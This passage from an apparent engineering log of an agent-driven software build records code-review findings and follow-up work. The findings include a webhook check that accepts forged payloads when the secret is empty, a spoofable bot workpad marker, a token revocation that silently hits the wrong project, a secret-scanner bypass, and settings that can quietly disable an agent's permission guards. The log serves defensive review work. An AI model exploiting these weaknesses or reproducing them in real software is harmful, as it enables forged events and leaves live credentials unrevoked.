the test's teeth.

*The rule this earns: a flake you cannot make fail is a flake you cannot prove you fixed — and the honest
verification of a flake fix is the same experiment run twice, once on each side of the change.*

**Two siblings filed rather than fixed**, both in `test/e2e/server/sse.e2e.test.ts`: `:158` uses a 50 ms sleep
as a sufficiency argument, and `:225` waits 100 ms and then makes a **negative** assertion, so it passes
vacuously if the frame is merely late (standing rule 4). Neither is flaking today.

The original fix brief carried three mutations it had to still fail (remove the per-topic `reset`, remove
the off-chain `shutdown`, make the drain unbounded), and with the instruction to prefer **injecting the
shutdown timer** over merely loosening the assertion, since the rest of that suite already runs on an
injected clock. *A flake you cannot make fail is a flake you cannot prove you fixed.*

### WP-08 — review round 1: an empty secret is a valid secret, and the marker was spoofed

**Verdict REQUEST_CHANGES**, one blocking finding, and the review's method is worth copying: it audited the
**provenance labels** against the live vendor documentation before it read a line of adapter code.

**Blocking — a binding with no webhook secret accepts anything.** `createJiraInboundNormaliser({secret:''})`
returns `verify === true` for `HMAC-SHA256('', body)`, which the attacker computes themselves. The only thing
in front of it is `capabilities.webhooks &&` at `index.ts:815`, and **deleting that guard kills 0 of 157
tests**, because the single negative test signs with the *real* secret. One guard covering for a missing one,
with no test able to tell — standing rule 4 in the security-critical place, and a comment asserting an
invariant that does not hold (rule 3). Rule 18 above is what it earned.

**The workpad marker was spoofed.** `addComment(ticket, "…\n\n`[agentic:marker:agentic:workpad]`")` posts a
comment **authored by the bot**, so the author check passes, and the next `upsertWorkpad` adopts and
overwrites it (same `comment_id`, count 2→2). The author check is not wrong, it is insufficient: agent
markdown is **derived from attacker-controlled ticket text** (BD-022), so "the bot wrote it" does not mean
"the platform wrote it".

**And the provenance labels were decoration.** Rewriting one fixture's label to `documented` with
`url: https://example.invalid` passed **157/157**. Rule 17 above. The fix is a reusable provenance test —
WP-09 has just labelled GitLab's fixtures the same way and WP-10 and WP-11 will follow.

**What the audit found when it checked the labels for real**, and this is the reassuring half: `myself` ✓,
`user-search` ✓ (no `emailAddress`, exactly as claimed), `remote-link-created` ✓ — it even reproduces the
documentation's own `/rest/api/issue/` typo — and the `composed` webhook fixture is honestly composed. **Both
claimed Atlassian documentation bugs are real** (`getIssue.fields.comment` is an array; `accoundId` appears
twice on the webhooks page), and the HMAC vector is Atlassian's verbatim. One note overclaimed: a fixture
said `isAvailable:false` "appears in Atlassian's own example", and it does not.

**Also:** an `IntegrationError` is thrown *outside* the executor carrying unredacted provider text, which
makes the WP's own `docs/TODO.md` claim that it "closed this by having no such path" false; and the author
check's `accountId === null` case fails **open** and survives all 157 tests.

**Confirmed sound:** the HMAC comparison is timing-safe and rejects duplicated headers, differing casing,
truncated hex and an empty body; **no path reaches the network outside the executor**; timestamps are
normalised at the adapter edge on every field read; dependencies are MIT and in the right package with
`throwHttpErrors: false` swallowing nothing; capabilities are honestly declared with typed refusals; a
shadow-mode transition performing a *read* is acceptable, since a read is not a mutation under BD-003 and
failing loudly beats a silent bad mapping; and **the contract suite is genuinely unmodified**.

### WP-09 — review round 1: the token that was never revoked, and provenance labels that held

**Verdict REQUEST_CHANGES**, one major. The contrast with WP-08 is the useful part: the same reviewer method
— audit the provenance labels against the live vendor documentation first — found WP-08's labels
**unenforced and one of them overclaiming**, and found **every one of WP-09's five audited labels correct**.
MR `!11`/`!13` verified field-by-field against the live attribute table, the `access_tokens` 201/204/404
responses verbatim, `protected_branches` 404 genuinely undocumented and honestly labelled `inferred`, the MR
409 likewise, and `DETAILED_MERGE_STATUSES` matching all 24 live values. Labelling fixtures honestly is
learnable; asserting the labels is a separate job, and WP-09's are as unasserted as WP-08's were.

**Major — `revokeCredential` DELETEs from the wrong project, and the idempotency hides it.** Minting uses
`request.project`, revocation uses `config.project`. Minted on `other/repo`, the only request sent was
`DELETE /projects/acme%2Fapi/access_tokens/58`; on a real instance that 404s, `notFoundIsNull` absorbs it,
`markRevoked` runs, and **the caller is told revocation succeeded while the push token lives to midnight
UTC**. With the documented `project: null` binding it is worse: revoke always throws and **zero** DELETEs are
ever sent. The idempotency built to absorb "already revoked" is precisely what makes "wrong address"
invisible. Rule 19 above.

**An unknown pipeline status kills the job for ever.** `mapPipelineStatus` throws inside `normalise`, so a
hook carrying `status: "waiting_for_quantum_runner"` raises rather than returning
`ignored('unsupported_event')` — and the port documents no `@throws` there. GitLab adds statuses. Rule 20
above draws the line this WP got backwards in one direction and right in the other: `MR_ACTIONS` already
ignores what it does not know.

**A self-contradictory mergeability result, biased optimistic.** `merge_status: 'can_be_merged'` with
`detailed_merge_status: 'conflict'` yields `{ mergeable: true, hasConflicts: true }` — wrong direction for a
gate WP-26 will trust. And the reviewer's **invented** mutation survived all 251 tests: `hasConflicts ?? null`
→ `?? false` on the `cannot_be_merged` branch, the one place the adapter's kindness is unpinned (rule 12).

**Judgement calls the reviewer made that are worth recording.** The run-time-assembled fake `whsec_` token is
**legitimate** — the plaintext `fake-gitlab-signing-key-do-not-use` sits visibly in the same expression, so
nothing is hidden — but it *is* a general scanner bypass, so the rule is "run-time assembly only when the
fake plaintext is a literal beside it". `diff_stats: null` is the right call, since `changes_count` is a
capped string, **and WP-39 must treat `null` as unknown rather than zero**. The amendment to
`docs/technical/10-testing-strategy.md` holds: `record:http` never existed as a script. `GitProviderPort`'s
missing protected-branch member is a follow-up, not a blocker.

**Also found:** `gitlab-replay.ts`'s `unused()` is **never called**, so a fixture no test exercises goes
unnoticed — rule 17's shape again, an unenforced check being worse than none.

### Notes WP-26 must honour (from WP-09's review)

**`mergeable: true` does not mean "no rebase needed".** WP-09's reviewer enumerated all 864
`merge_status` × `detailed_merge_status` × flag combinations and found zero self-contradictory results — but
two residuals by documented design: `can_be_merged` + `need_rebase` and `can_be_merged` + `commits_status`
both map to `{mergeable: true, hasConflicts: false}`, and a `has_conflicts: true` arriving beside
`can_be_merged` is discarded. **The port therefore cannot express "needs rebase" at all**, so WP-26's rebase
gate must not infer it from `mergeable`. Either the port grows a rebase-state member (with fake and suite
case — standing rule 23) or WP-26 reads `detailed_merge_status` through a provider-specific route and says
so.

### Obligations WP-15 and WP-19 must honour (from WP-12's review)

- **`cost_unreported` is a fault published as an overspend.** When the CLI reports no usable
  `total_cost_usd`, WP-12 stops the run with terminal reason `error_max_budget_usd` and status
  `budget_exceeded`, carrying the distinct name in `RunOutcome.error` and the `run_stopped` row's
  `data.reason`. The reviewer judged this acceptable — `RunTerminalReason` is a closed contract plus a PG
  enum, and BD-010's branch is the same — but **WP-15 must branch on `data.reason`, and WP-19 must not count
  a `cost_unreported` run as spend.** A blind budget stop is not an overspend, and a cost ledger that adds
  it up is wrong in the direction that matters.
- **`managedSettings` has a precondition that can silently disable it.** Binary 2.1.267 @159286173:
  `parentSettingsBehavior` is first-wins by default, so the parent is dropped and admin tiers become the only
  policy source. On a host carrying any admin managed tier — MDM, `/Library/Application Support/ClaudeCode`,
  `/etc/claude-code`, i.e. `local` provider mode on a managed laptop — **`allowManagedPermissionRulesOnly`
  and `allowManagedHooksOnly` both vanish**, and with them the guarantee that project settings cannot shadow
  `canUseTool`. WP-22 and WP-23 should make this an operator check.

### OPEN-QUESTIONS numbering, third collision — the convention holds but the arithmetic is manual

State at the time of writing: `main` has **Q40** (WP-09, branch-pattern scoping on a minted token). WP-12's
branch carries **Q41** — the orchestrator renumbered it from Q40 when merging `main` in, and the conflict
landed on the same hunk, exactly the loud failure WP-09's implementer predicted when taking the number.
WP-10 took **Q42**, having seen Q41 already in use. WP-11 took **Q41** and flagged the collision risk itself.

So WP-11's question must become **Q43** at merge. Three parallel work packages produced three collisions in
one session, every one caught, none silently. **The convention works and is still manual**: the orchestrator
renumbers at merge, and an implementer that says which number it took — as all three did — is what makes the
renumbering cheap. A generated number would be worse; the conflict is the signal.

### WP-10 and WP-11 — what the ledger bought

Both were briefed with the six rules WP-07, WP-08 and WP-09 had paid for, and both applied them **before a
reviewer had to**:

- **WP-10 caught its own rule-10 failure.** Its `opens-a-second-task-thread` mutation *survived*, because
  "same `thread_id`" was satisfied by both branches — so it added `providerCalls()` to the shared suite and
  the mutation then died. That is exactly the defect rule 10 names, found by the author rather than by a
  reviewer.
- **WP-10 added three things to the shared contract suite** (rule 23) rather than to its own tests: unknown
  event ignored-not-thrown, a no-credential binding verifies nothing, and `providerCalls()`. The
  empty-credential case is rule 18, which WP-08 shipped as a live hole — closed here before it existed.
- **WP-10 left one mutation alive and labelled it** (rule 22): the `v0=` prefix check is unreachable behind
  the whole-string compare.
- **WP-11 canaried its mutation harness three ways** — planted failure → DEAD-with-name, comment change →
  ALIVE, syntax error → RUNNER-ERROR — and reports it *first misread an `afterAll` failure and was
  recalibrated* (rule 21, earned twice before it).
- **WP-11 left one mutation alive and corrected the claim instead of the code**: `BigInt` → `Number` on
  nanoseconds produces identical millisecond output, so the docblock and test were overclaiming and were
  narrowed (rule 3).
- **WP-11 declared `agentTooling: null` for Sentry** rather than guessing a CLI contract — MCP is OAuth-only
  and `sentry-cli` has no issue commands — the same call WP-08 made and the right one.

Both also refused to invent: WP-11's `SOURCES.md` files list pages that produced **no** fixture, including
`docs.sentry.io/api/events/` (21 endpoints) and `mcp.sentry.dev`, so a later reader can tell "checked and
unused" from "never looked".

### CI does not run `ignored:check`

Found by WP-10 while wiring the new NUL guard into CI's lint job: **`ignored:check` runs inside `verify` but
in no CI job of its own.** That guard has already caught two live defects — `apps/server/src/data/` swallowed
by an unanchored `data/` rule at WP-06, and the nested-worktree walk at WP-06a — so it is worth a gate rather
than a local-only check. Fold it into the next `ci-fix` alongside the NUL guard.

## Discovered work (not in plan)

- **Orchestrator parallelism has a ceiling, and it is lower than it looks.** Running three implementers plus
  reviews drove this 14-core host to load average ~143. Two consequences: WP-02's model tests, which measure
  ~1.2s idle, measured 4.2-7.5s under load and *timed out locally* against the old 5s default — the same
  defect CI had already caught; and WP-05's timing evidence had to be gathered deliberately under load to
  mean anything. **Rule for the rest of this session: at most two or three concurrent agents, and never
  judge a timing-sensitive suite while implementers are running.** The 30s property-test cap is sized for
  exactly this, which is the argument for the cap rather than against it.

- **OPEN-QUESTIONS numbering collides when WPs run in parallel.** WP-05's worktree branched from `ca1ae06`,
  before WP-02 landed Q36 (RBAC map) and Q37 (command block-list), so it filed its working-day-calendar
  question as **Q36** too. Renumbered to **Q38** at merge (done). *Convention from here on:* an implementer must
  re-check the highest existing question number against `main` immediately before writing, and the
  orchestrator renumbers at merge when parallel worktrees collide. The same hazard applies to migration
  file numbers (`0001`-`0009` today) — two parallel WPs both adding `0010` would both pass in isolation and
  collide on merge.
- **pg-boss `persistQueueStats` is pinned off deliberately (WP-05).** `platform_app` has USAGE but not
  CREATE on schema `pgboss` and owns nothing there. Enabled, stats collection works all day and then fails
  at UTC midnight on the background error channel — a failure mode that would look random. Turning it on
  requires a new migration granting CREATE; not done, and the constraint is asserted by an integration test.

- **ci-fix (WP-02, run 34363371997): a property test that only fails on CI.**
  `packages/domain/src/aggregates/task.model.test.ts:531` times out at Vitest's 5000ms default on GitHub's
  2-core runner while passing locally — 795 tests passed, this one failed, every other job green. The gate
  is only as good as its slowest runner, so the fix is an explicit generous timeout for property and
  model-based tests (not a nudged number) plus an audit of the other property tests in `packages/domain`
  for the same fragility. Folded into WP-02a's worktree rather than a fourth worktree, as a separate commit.
  **Lesson for later WPs: a test that passes locally by a hair is not green.** Property tests need headroom
  and a pinned `numRuns`, and CI is the authority, not this machine.

- **CI: the `commitlint` and `dco` jobs never run.** Both are `pull_request`-only, but this session commits
  directly to `main` and never opens a PR, so both report `skipped` on every push (verified on run
  34360466443). WP-00's "DCO check" acceptance criterion is met on paper only. Fix: add `push` to their
  triggers (checking `BASE..HEAD` or the pushed range). Low risk today — lefthook runs commitlint locally
  and every commit so far carries a `Signed-off-by` — but it is an unverified gate. **Do this at the
  5-WP checkpoint.**

- **WP-00 non-blocking, deferred (reviewer round 3):** `CLAUDE.md:20` documents `pnpm eval`, which has no
  `package.json` script yet — add a stub or drop the line at **WP-17**. `CLAUDE.md:15` lists `docker/` and
  `schemas/` which do not exist yet (target layout; `schemas/` lands in WP-01, `docker/` in WP-22).
  `pnpm secrets:scan` (`dir .`) honours `.gitignore`, so a stray local `.env` is invisible to it — CI's
  full-history scan is the real gate.
- **Renovate rule needed** for the `ghcr.io/gitleaks/gitleaks` digest pin in `scripts/gitleaks.mjs`, so the
  pinned image is bumped like any other dependency.
- **Import-boundary lint** enforcing `domain ← application ← infrastructure/integrations ← apps` does not
  exist; the dependency rule currently holds only by absence of cross-package imports. Add it in WP-01/02
  when the first workspace dependency lands.

- ~~**Agent role files carried the broken command:** `.claude/agents/{implementer,reviewer}.md` told
  every subagent to run `pnpm -s verify`.~~ Fixed by the orchestrator in round 3 (all three role
  files, including `architect.md`). The implementer was right to leave harness configuration alone.
- ~~**Verification contract wording (WP-00):** the protocol doc said `pnpm -s verify`.~~ Corrected by
  the orchestrator in round 2.
- **CI workflows still to add (technical/11):** `integration.yml`, `evals.yml`, `nightly-llm.yml`,
  `image.yml`, `base-image.yml`, `release.yml`, `codeql.yml`, `secrets-scan.yml` (weekly trufflehog),
  `mutation.yml`; plus `.github/ISSUE_TEMPLATE/*`, `CODEOWNERS`, `dependabot.yml` (security only),
  `CODE_OF_CONDUCT.md`, `THIRD_PARTY_NOTICES.md`, and the `actionlint`/`hadolint`/`zizmor` steps in
  the lint job (hadolint needs `docker/` from WP-22). Rulesets, required checks and the merge queue
  are GitHub-side configuration a human has to apply.
- **WP-05 ↔ WP-04 reconciliation, decided by the orchestrator at WP-04 review round 1 and
  implemented.** `event_dispatch` plus the sweep stay the **single queue of record**; pg-boss does
  **not** get a `dispatch(event)` job. Two queues would disagree after a crash, and pg-boss has no
  per-stream serialisation, so ordering would collapse onto `hasEarlierPending` refusing and
  rescheduling — a retry storm where head-of-line blocking belongs. WP-05 replaces only the *timer*:
  `OutboxWorker` takes a `DrainScheduler` (`schedule(name, intervalMs, run)`, job name
  `OUTBOX_SWEEP_JOB = 'events.outbox.sweep'`, implementations should coalesce overlapping runs —
  pg-boss `singleton`), and the `NOTIFY` subscription keeps waking `drain()` for latency. The seam is
  defined in `packages/application/src/events/outbox.ts` because WP-05's `Jobs` port was not on
  WP-04's base; WP-05 implements `DrainScheduler` over it. Scheduled concurrency must respect the
  pool invariant below. `PARTITION_MAINTENANCE_JOB` (WP-03) is still WP-05's to schedule.
- **Dispatch has no dead-letter state (WP-04).** An event whose handler keeps failing is retried with
  exponential backoff for ever and blocks its stream. `handler_executions.status = 'failed'` and the
  `event_dispatch` backlog are the only signals; WP-06 should surface them (`/metrics`, an ops view)
  and WP-15 should decide what a permanently poisoned event does to its task.
- **`events.id` and `cause_event_id` are not in technical/03** (added by WP-04's migration 0010; the
  event catalogue in technical/02 has always required them). The data-model document should be
  amended to match.
- **The two `*.model.test.ts` property suites are close to the 5 s default timeout.** WP-02's
  `task.model` and `run.model` `fc.commands` tests take ~3 s each in isolation and time out when the
  machine is loaded (observed at WP-04 with several worktrees running at once: 9–10 s, red; the same
  commit is green when the machine is idle). Nothing about them is wrong — the budget is. Either give
  the `unit` project a `testTimeout` above the default or lower their `numRuns`; a suite that is red
  only under load is a suite CI will call flaky.
- **Biome `noConsole`** is not enabled yet; turn it on for server code when pino lands (WP-06).
- **Licence allow-list check** (`pnpm licenses`, TD-017) is not wired; it belongs with WP-23's
  `THIRD_PARTY_NOTICES.md`.
- **Agent registry:** in session 1 the roles in `.claude/agents/{implementer,reviewer,architect}.md` were not exposed as `subagent_type` values, and the orchestrator worked around it with `general-purpose` subagents. **In session 2 they are registered** (`implementer`, `reviewer`, `architect` appear as agent types with the tool sets their role files imply), so they are spawned directly — and still told, as their first instruction, to read and obey their role file, because the registration carries the tool list but not the protocol.

## Milestone notes

See "Checkpoint 1" above.
